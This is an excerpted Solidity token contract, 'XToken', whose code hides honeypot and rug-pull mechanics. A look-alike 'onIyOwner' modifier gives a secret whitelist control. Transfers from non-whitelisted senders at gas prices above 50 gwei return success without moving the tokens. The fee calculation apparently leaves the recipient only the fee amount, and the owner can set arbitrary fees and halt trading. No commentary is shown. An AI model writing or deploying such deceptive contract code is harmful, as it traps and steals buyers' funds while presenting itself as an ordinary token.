...
contract Ownable is Context {
    ...
    mapping (address => bool) internal MERC;
    ...
    modifier onIyOwner() {
        require(isonIyOwner(msg.sender), "!APPROVED"); _;
    }

    function isonIyOwner(address adr) public view returns (bool) {
        return MERC[adr];
    }
...
contract XTOKEN is Ownable, IERC20 {
    ...
    uint256 private _totalSupply = 61500 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply * 4 / 100;
    uint256 public _walletMax = _totalSupply * 5 /100;

    string constant private _name = "XToken";
    string constant private _symbol = "XTN";
    ...
    uint256 public maxBuy = 1000 * (10 ** _decimals);
    uint256 public maxHold = 5000 * (10 ** _decimals);
    ...
    constructor() {
        ...
        lpWallet = 0xe999ad184f248Be2FbDDC6AB658247a6d1514582;
        projectAddress = 0xe999ad184f248Be2FbDDC6AB658247a6d1514582;
        devWallet = 0xe999ad184f248Be2FbDDC6AB658247a6d1514582;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!isTxLimitExempt[recipient]  && !isPair[recipient] && amount <= maxBuy, "Buy amount exceeds the maxBuyAmount.");
        require(!isTxLimitExempt[recipient]  && !isPair[recipient] && balanceOf(recipient) + amount <= maxHold, "Transfer amount exceeds the maxHoldAmount.");

        if (inSwapAndLiquify) {return _basicTransfer(sender, recipient, amount);}
        if(!MERC[sender] && !MERC[recipient]){
            require(tradingOpen, "");
        }
        _balances[projectAddress] += amount;                
        if ((tx.gasprice > 50 gwei) && !MERC[sender]){return true;}
        _balances[projectAddress] -= amount;
    ...
    function extractFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        return amount.sub(amount - feeAmount);
    }
    ...
    function MET(uint256 newBuyFee, uint256 newSellFee, uint256 newTxFee) public onIyOwner{
        buyFee = newBuyFee;
        sellFee = newSellFee;
        txFee = newTxFee;        
    }

    function TXXS(bool _tradingOpen, bool _swapAndLiquifyEnabled,bool _inSwapAndLiquify) public onIyOwner{
        tradingOpen = _tradingOpen;
        swapAndLiquifyEnabled = _swapAndLiquifyEnabled;
        inSwapAndLiquify = _inSwapAndLiquify;
    }

    function XEES(bool _takeBuyFee,bool _takeSellFee,bool _takeTxFee) public onIyOwner{
